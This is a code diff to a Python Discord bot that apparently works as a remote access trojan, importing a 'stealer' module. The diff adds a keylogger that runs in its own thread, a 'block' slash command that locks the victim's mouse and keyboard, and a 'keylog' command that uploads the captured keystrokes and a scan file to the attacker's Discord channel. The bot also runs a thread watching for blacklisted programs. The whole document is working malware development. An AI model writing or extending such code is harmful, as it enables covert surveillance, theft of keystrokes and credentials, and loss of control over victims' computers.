@@ -14,9 +14,11 @@ import os
 import threading
 import json
 import subprocess
+import asyncio
 #my imports
 from modules import basic_functions as functions
 from modules import stealer
+from modules import keylogger
 #local settings
 ctx = SlashContext
 # Check if the file is in the final folder
@@ -422,12 +424,93 @@ async def ip_info(ctx: SlashContext):
     stealer.ip_info()
     await ctx.send(file=File(f'{os.getcwd()}/output.txt'))
     os.remove(f'{os.getcwd()}/output.txt')
+#block input
+@slash_command(
+    name="block",
+    description="block the input(mouse and keyboard)",
+)
+
+@slash_option(
+    name="block",
+    description="block input",
+    required=True,
+    opt_type=OptionType.BOOLEAN,
+)
+async def block(ctx: SlashContext, block: bool):
+    # load all channel ids 
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("error can only be executed in main.")
+        return
+    if(block==True):
+        functions.block_input()
+        await ctx.send("input blocked")
+    else:
+        functions.unblock_input()
+        await ctx.send("input unblocked")
+#keylog
+@slash_command(
+    name="keylog",
+    description="get result fom keylogger",
+)
+
+@slash_option(
+    name="clear",
+    description="do you want to delete the old keylogs?",
+    required=True,
+    opt_type=OptionType.BOOLEAN,
+)
+async def keylog(ctx: SlashContext, clear: bool):
+    # load all channel ids 
+    config_custom = functions.get_ids()
+    # load channel id
+    channel = bot.get_channel(ctx.channel_id)
+    # check category
+    if channel.parent_id != config_custom["category_id"]:
+        return
+    # check if channel == main
+    if ctx.channel_id != config_custom["main_channel_id"]:
+        await ctx.send("error can only be executed in main.")
+        return
+    functions.check_keylog()
+    await ctx.send(file=File(f'{os.getcwd()}/keylog.txt'))
+    try:
+        await ctx.send(file=File(f'{os.getcwd()}/scan.txt'))
+        os.remove(f'{os.getcwd()}/scan.txt')
+    except Exception as e:
+        print(e)
+    if(clear==True):
+        os.remove(f'{os.getcwd()}/keylog.txt')
 #-----------------------------------------------------------------------------------------------------------------------------------
 # start everything
 #-----------------------------------------------------------------------------------------------------------------------------------
+def start_bot():
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
 
-# start blacklist thread
+    # Starte den Bot im aktuellen asynchronen Loop
+    loop.run_until_complete(bot.start(config["token"]))
+
+# Starte den Monitoring-Thread
 monitoring_thread = threading.Thread(target=functions.monitor_blacklisted_programs)
 monitoring_thread.start()
-#start bot
-bot.start(config["token"])
+
+# Starte den Keylogger-Thread
+keylog_thread = threading.Thread(target=keylogger.start_keylogger)
+keylog_thread.start()
+
+# Starte den Bot in einem asynchronen Thread
+bot_thread = threading.Thread(target=start_bot)
+bot_thread.start()
+
+# Warte auf die Beendigung der Threads
+monitoring_thread.join()
+keylog_thread.join()
+bot_thread.join()
+
